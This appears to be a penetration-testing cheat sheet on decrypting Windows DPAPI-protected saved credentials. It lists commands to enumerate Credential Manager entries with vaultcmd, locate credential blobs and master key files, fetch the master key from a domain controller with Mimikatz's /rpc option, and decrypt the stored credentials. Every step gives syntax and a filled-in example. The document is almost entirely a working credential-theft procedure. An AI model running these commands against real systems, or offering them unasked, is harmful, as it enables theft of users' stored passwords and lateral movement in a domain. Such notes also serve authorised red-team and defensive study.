DPAPI (https://en.wikipedia.org/wiki/Data_Protection_API)

Check saved credentials in Credential Manager for the current user:
    example: vaultcmd.exe /listcreds:"Windows Credentials" /all

Find the credential blobs in "C:\Users\<user>\AppData\Local\Microsoft\Credentials" and dump them with Mimikatz:
    Step 1:
        syntax : mimikatz.exe "privilege::debug" "dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<credentialBlob>" exit
        example: mimikatz.exe "privilege::debug" "dpapi::cred /in:C:\Users\d.alderson\AppData\Local\Microsoft\Credentials\1DD604C1E148746934B92E2A20319754" exit
    Step 2:
         Grab the guidMasterKey value

Find the masterkey information in "C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<userSid>":
    Step 1: Find SID for current user with "whoami /all"
    Step 2: There's a directory that matches the guidMasterKey

Retrieve the MasterKey from the Domain Controller:
    Step 1:
        syntax : mimikatz.exe "privilege::debug" "dpapi::masterkey /in:C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<userSid>\<guidMasterKey> /rpc" exit
        example: mimikatz.exe "privilege::debug" "dpapi::masterkey /in:C:\Users\d.alderson\AppData\Roaming\Microsoft\Protect\S-1-5-21-3865823697-1816233505-1834004910-1132\fcf4f725-0947-4180-a924-bc9da9ed8910 /rpc" exit
    Step 2:
        Grab the key value

Decrypt the credential blob with the MasterKey:
    syntax : mimikatz.exe "privilege::debug" "dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<credentialBlob> /masterkey:<masterKey>"
    example: mimikatz.exe "privilege::debug" "dpapi::cred /in:C:\Users\d.alderson\AppData\Local\Microsoft\Credentials\5DD604C1E108746934B92E2A20318758 /masterkey:<masterKey>"

